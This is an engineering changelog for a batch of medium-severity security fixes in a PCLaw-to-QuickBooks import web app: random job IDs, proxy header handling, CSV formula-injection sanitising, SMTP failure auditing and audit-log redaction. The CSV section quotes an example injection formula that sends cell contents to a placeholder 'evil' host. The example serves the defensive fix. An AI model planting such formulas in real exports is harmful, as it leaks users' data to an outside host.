# Security Hardening — Batch 2 (medium-severity findings)

This document records the second round of security hardening shipped on
top of PR #14. It captures the *what* and *why* of each change, the
operator-visible side effects, and what's still open.

Companion docs: see `SECURITY_HARDENING_ROADMAP.md` for the long-term
roadmap and `SECURITY_NOTES.md` for the per-feature design rationale.

## What changed in this batch

### 1. Randomized job IDs (`job_<ts>_<entropy>`)

**Was:** `job_id = f"job_{timestamp}"` — purely a 14-digit UTC timestamp,
which is guessable to within a few seconds and collides whenever two
uploads land inside the same second.

**Now:** `job_id = f"job_{timestamp}_{token_urlsafe(12)}"` — appends 96
bits of cryptographic entropy from `secrets.token_urlsafe(12)`. The
timestamp prefix is preserved for sortability in the filesystem and the
DB.

**Why it matters:** tenancy is already enforced in `_job_or_403` (which
404s on cross-firm access), but an unguessable ID is defense-in-depth
against (a) future route bugs that forget to call the helper, (b)
referer-header leakage if a user clicks an outbound link from a job
page, and (c) browser-history scraping.

**Compatibility:** existing jobs created with the old timestamp-only ID
still resolve. The route `<job_id>` accepts both shapes. Filenames on
disk now include the entropy too, so two uploads in the same second no
longer overwrite each other.

**Test:** `tests/smoke_security_hardening.py::T1`.

### 2. Render trusted-proxy handling (`ProxyFix`)

**Was:** no proxy middleware. Render terminates TLS at the edge and
forwards plaintext HTTP with `X-Forwarded-Proto: https` /
`X-Forwarded-Host: <user-host>`. Without ProxyFix `request.scheme` was
`http`, which broke `url_for(..., _external=True)` for
password-reset / OAuth-callback links and could make HTTPS-only
checks misfire.

**Now:** in production we wrap `app.wsgi_app` with
`werkzeug.middleware.proxy_fix.ProxyFix(x_for=1, x_proto=1, x_host=1,
x_port=0, x_prefix=0)`. The "1" trusts **exactly one** forwarded hop
— Render's edge — so an attacker further down the chain cannot spoof
the headers. The hop count is overridable via `TRUSTED_PROXY_HOPS` env
for multi-proxy deploys (CloudFront → ALB → app = 2).

**Assumptions:**

* Render is the only proxy in front of the app.
* The app never trusts arbitrary `X-Forwarded-*` headers from internal
  callers — only those overwritten by the single trusted hop.
* Local dev (`APP_ENV in {local, dev, test}`) does **not** apply
  ProxyFix; direct `http://localhost:5000` testing continues to work.

**Operator action:** none in the default Render config. If you put a
second proxy in front of Render, set `TRUSTED_PROXY_HOPS=2`.

**Test:** `tests/smoke_security_hardening.py::T6` exercises ProxyFix
end-to-end on a tiny WSGI callable to confirm scheme/host rewrite.

### 3. CSV formula-injection protection

**Was:** `pclaw_parser.export_qbo_csv` wrote user-supplied
`description` / `account` strings straight into the QBO-shaped
intermediate CSV. An attacker who controls a PCLaw memo could write
`=HYPERLINK("http://evil/?x="&A1, "Click")` and weaponize an Excel
session if an operator opened the intermediate file.

**Now:** new module `csv_safety.py` exposes `sanitize_csv_cell()` /
`sanitize_csv_row()`. Cells whose first character is one of `=`, `+`,
`-`, `@`, TAB, or CR are prefixed with a single tick (`'`) — the
OWASP-recommended convention. Excel and Sheets strip the tick on
display, so users see the same memo, but the cell is no longer parsed
as a formula. Applied to every cell of `export_qbo_csv`'s rows.

**Why a tick, not removal:** removing the leading character would
*change the data*. The tick is invisible to the recipient on screen
and preserves provenance of the original text. The internal QBO
write path reads the in-memory rows, not the round-tripped CSV, so
the tick never reaches QBO.

**Other CSV surfaces audited:**

* `/onboarding/template.csv` and `/onboarding/sample.csv` — static,
  curated content, no user input. **No sanitization needed.**
* Operator panel — read-only HTML, no CSV exports. **No change.**
* `import_history` — JSON in DB, no CSV download. **No change.**

**Test:** `tests/smoke_security_hardening.py::T2` covers both the unit
behavior of `sanitize_csv_cell` and an end-to-end upload whose memo
starts with `=HYPERLINK` and confirms the on-disk CSV neutralizes it.

### 4. SMTP failure visibility

**Was:** password-reset email failures were swallowed inside
`email_sender.send_email()`. The user got the generic
"if-the-email-exists" response (good — no oracle), but an operator had
no idea a real user's reset never landed.

**Now:** `_send_reset_email` adds:

* `password_reset_email_send_failed` audit row when SMTP is configured
  but `send_email()` returns False (transport / auth / reject).
* `password_reset_smtp_missing` audit row (already existed) **plus** a
  WARN-level structured log line so external log shipping picks it up.

Neither row includes the recipient email, the token, or any SMTP
credential material. Only the non-secret host/port metadata from
`email_sender.smtp_status()` is recorded so an operator can correlate
to a Render env-var typo.

**Open follow-up:** an alert / on-call page when these audit actions
spike is still on the roadmap — that requires the centralized log
shipping listed under "Logging, monitoring, audit" in
`SECURITY_HARDENING_ROADMAP.md`.

### 5. Audit-log PII / secret minimization

Two changes:

**Email redaction.** `_redact_email_for_audit(email)` renders
`alice@acme.test` as `a***@acme.test` — first character of the local
part plus the full domain. Used by the `signup`, `login`, and
`login_failed` audit calls. A SOC2 reviewer can still tell *which*
tenant attempted a login (the `user_id` column is canonical) without
the full personal email showing up everywhere.

**Token / credential scrubbing.** `_sanitize_audit_details(details)`
runs a single regex pass over the detail string before it hits the
audit table. It replaces tokens of the form
`access_token=…`, `refresh_token=…`, `Authorization: Bearer …`,
`api_key=…`, etc. with `[redacted]`, and truncates the resulting
string to 500 chars + `…(truncated)`. This is wired into the central
`_audit()` helper and into `_audit_details_with_tid()`, so every
import / verify / refresh / OAuth path benefits. Importantly,
`intuit_tid` is preserved unchanged — it is opaque and carries the
support value we want.

**Other PII surfaces audited:**

* `details=str(e)` from QBO errors — now sanitized centrally.
* Upload row's `details=f"{company} / {safe_name}"` — neither field
  is a secret (company name is firm-chosen, filename is operator
  diagnostic). **Kept.**
* Onboarding sample bodies in routes — static, no PII. **Kept.**

**Test:** `tests/smoke_security_hardening.py::T3` (email redaction)
and `::T4` (token scrub + truncation). Existing
`tests/smoke_production_customer.py` also asserts no SECRET_KEY /
QBO_CLIENT_SECRET / token markers appear in rendered routes.

## Things deliberately left for a later batch

These are listed here so we don't lose track. None are blockers for
this PR.

* **MFA / TOTP for admin + operator accounts** — out of scope for a
  batch focused on the medium findings.
* **Encryption-key rotation** — needs a keyring + background
  re-encrypt; tracked under "Data protection / key rotation".
* **Centralized log shipping** — required before SMTP-failure alerting
  is useful.
* **Anti-malware scan on uploads** — still needs a tool decision
  (ClamAV vs. third-party service) and a Render disk-mount review.

## Operator deploy checklist

1. Pull `security/medium-hardening-batch` and review the diff.
2. Merge to `main`. Render auto-deploys on push to `main`.
3. **No new env vars are required.** Optional: set
   `TRUSTED_PROXY_HOPS=2` if you ever stick a second proxy in front
   of Render.
4. After the deploy:
   * Open the dashboard's audit panel and confirm the most recent
     `signup` / `login` rows now render `a***@example.com` rather
     than the full address.
   * Upload a fresh PCLaw CSV and confirm the resulting job URL
     contains `_` after the timestamp followed by a 16+ char random
     suffix.
   * Hit `/healthz` and confirm `ready_for_go_live` is still `true`.

## Rollback

`git revert <merge-sha>` is safe — none of the changes alter on-disk
data layout in an irreversible way:

* Existing `job_<ts>` IDs in SQLite continue to resolve through the
  same `<job_id>` route after revert.
* The CSV sanitizer only adds leading ticks; reverting stops adding
  them on new exports but old CSVs on disk stay readable.
* ProxyFix is opt-in via `IS_PRODUCTION + TRUSTED_PROXY_HOPS`;
  reverting just stops applying it.
* Audit-log redaction is forward-only; old rows are unaffected.
